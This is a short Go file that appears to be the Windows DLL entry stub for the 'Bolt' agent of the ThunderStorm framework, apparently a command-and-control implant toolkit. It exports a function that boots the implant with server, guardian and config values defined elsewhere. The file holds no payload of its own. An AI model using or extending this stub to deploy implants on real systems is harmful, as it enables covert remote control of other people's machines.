// +build windows
// ThunderStorm Bolt Agent Stub

package main

import "C"
import (
	"runtime/debug"

	"github.com/iDigitalFlame/ThunderStorm/bolt"
	"golang.org/x/sys/windows"
)

var boltUnlock = windows.NewLazySystemDLL("kernel32.dll").NewProc("GetProcessVersion")

func main() {}

//export boltAgent
func boltAgent(i C.int) {
	debug.SetMaxStack(256000000)
	bolt.BootEx(
		i > 1, boltGuardian, boltServer, boltConfig,
		func() { boltUnlock.Call(13371) }, func() { boltUnlock.Call(13372) },
	)
}
